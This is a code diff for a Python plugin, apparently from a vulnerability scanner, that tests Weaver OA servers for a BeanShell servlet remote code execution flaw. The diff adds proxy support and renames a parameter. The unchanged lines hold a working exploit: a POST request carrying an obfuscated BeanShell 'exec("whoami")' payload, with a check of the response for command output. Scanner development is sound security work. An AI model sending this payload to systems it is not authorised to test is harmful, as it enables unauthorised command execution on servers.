@@ -33,7 +33,8 @@ def UrlProcessing(url):
 
 payload= '/weaver/bsh.servlet.BshServlet'
 post_data = 'bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'
-def medusa(Url,RandomAgent,UnixTimestamp):
+def medusa(Url,RandomAgent,Token,proxies=None):
+    proxies=ClassCongregation.Proxies().result(proxies)
 
     scheme, url, port = UrlProcessing(Url)
     if port is None and scheme == 'https':
@@ -53,13 +54,13 @@ def medusa(Url,RandomAgent,UnixTimestamp):
             "Content-Type": "application/x-www-form-urlencoded",
             'User-Agent': RandomAgent,
         }
-        resp = requests.post(payload_url, data=post_data,headers=headers, timeout=10, verify=False)
+        resp = requests.post(payload_url, data=post_data,headers=headers, proxies=proxies,timeout=10, verify=False)
         con = resp.content
         code = resp.status_code
         if code==200 and (con.lower().find('system:')!=-1 or con.lower().find('root:')!=-1):
             Medusa = "{} 存在泛微OA远程代码执行漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
             _t = VulnerabilityInfo(Medusa)
-            ClassCongregation.VulnerabilityDetails(_t.info, url,UnixTimestamp).Write()  # 传入url和扫描到的数据
+            ClassCongregation.VulnerabilityDetails(_t.info, url,Token).Write()  # 传入url和扫描到的数据
             ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
     except Exception as e:
         _ = VulnerabilityInfo('').info.get('algroup')
